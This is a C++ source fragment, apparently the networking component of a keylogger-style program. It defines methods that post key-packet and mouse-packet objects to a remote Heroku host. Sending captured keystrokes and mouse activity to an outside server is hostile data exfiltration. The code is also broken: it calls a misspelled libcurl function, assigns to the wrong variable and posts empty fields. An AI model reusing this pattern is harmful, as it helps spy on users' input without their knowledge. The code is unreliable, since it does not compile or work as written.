HttpPost::HttpPost()
{
  curl_global_init(CURL_GLOBAL_ALL);
  curl = curl_easy_init();
  rest = 0;
}

HttpPost::~HttpPost()
{
  curl_global_cleanup();
}

bool	HttpPost::postPaquetKeys(PaquetKeys *paquet)
{
  if (!curl || !paquet)
    return false;
  curl_easy_setopt(curl, CURLOPT_URL, "spidermen.herokuapp.com/paquet_keys");
  curl_easy_setopt(curl, CURLOPT_POSTFIELDS, "");
  res = curl_easy_perfom(curl);
  if (res != CURLE_OK)
    {
      std::cout << curl_easy_strerror(res) << std::endl;
      curl_easy_cleanup(curl);
      return false;
    }
  curl_easy_cleanup(curl);
  return true;
}

bool HttpPost::postPaquestMouse(PaquetMouse *paquet)
{
  if (!curl || !paquet)
    return false;
  curl_easy_setopt(curl, CURLOPT_URL, "spidermen.herokuapp.com/paquet_mouses");
  curl_easy_setopt(curl, CURLOPT_POSTFIELDS, "");
  res = curl_easy_perfom(curl);
  if (res != CURLE_OK)
    {
      std::cout << curl_easy_strerror(res) << std::endl;
      curl_easy_cleanup(curl);
      return false;
    }
  curl_easy_cleanup(curl);
  return true;
}
